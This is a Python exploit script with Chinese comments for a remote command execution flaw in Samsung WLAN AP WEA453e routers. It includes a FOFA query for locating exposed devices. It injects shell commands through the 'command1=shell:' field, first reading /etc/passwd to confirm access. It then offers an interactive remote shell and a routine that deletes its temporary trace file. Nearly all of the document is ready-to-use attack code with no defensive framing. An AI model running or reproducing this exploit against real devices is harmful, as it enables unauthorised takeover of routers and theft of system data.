'''
#! /usr/bin/python3
#fofa search: title="Samsung WLAN AP"
About:WLAN-AP-WEA453e RCE(三星路由器远程命令执行漏洞)
'''

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import sys
import os
from urllib3.exceptions import InsecureRequestWarning
proxy=None
def set_agent(p):#设置代理
    global proxy
    proxy=p
class exp:

    def Checking(self):
        try:
            Url = self.target + "(download)/tmp/hello.txt"
            CkData = "command1=shell:cat /etc/passwd| dd of=/tmp/hello.txt"
            response = requests.post(url = Url,data = CkData,verify = False,timeout = 20,proxies=proxy)
            if(response.status_code == 200 and 'root:' in response.text):
                return True
            else:
                return False
        except Exception as e:
            #print("checking")
            print("[-] Server Error!")

    def Exploit(self):
        Url = self.target + "(download)/tmp/hello.txt"
        while True:
            try:
                command = input("# ")
                if(command == 'exit'):
                    self.Clean()
                    sys.exit()
                if(command == 'cls'):
                    os.system("cls")
                    continue
                data = "command1=shell:" + command + "| dd of=/tmp/hello.txt"
                response = requests.post(url = Url,data = data,verify = False,timeout = 20,proxies=proxy)
                if(response.text == None):
                    print("[!] Server reply nothing")
                else:
                    print(response.text)
            except KeyboardInterrupt:
                self.Clean()
                exit()
            except Exception as e:
                print("[-] Server not suport this command")

    def Clean(self):
        Url = self.target + "(download)/tmp/hello.txt"
        try:
            CleanData = "command1=shell:busybox rm -f /tmp/hello.txt"
            response = requests.post(url = Url,data = CleanData,verify = False,timeout = 10,proxies=proxy)

            if(response.status_code == 200):
                print("[+] Clean target successfully!")
                sys.exit()
            else:
                print("[-] Clean Failed!")
        except Exception as e:
            print("[-] Server error!")

    def __init__(self,target,port):
        self.target=target
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

        if(len(sys.argv) == 3):
            module = sys.argv[2]
            if(module == 'clean'):
                self.Clean()
            else:
                print("[-] module error!")

        while self.Checking() is True:
            self.Exploit()
  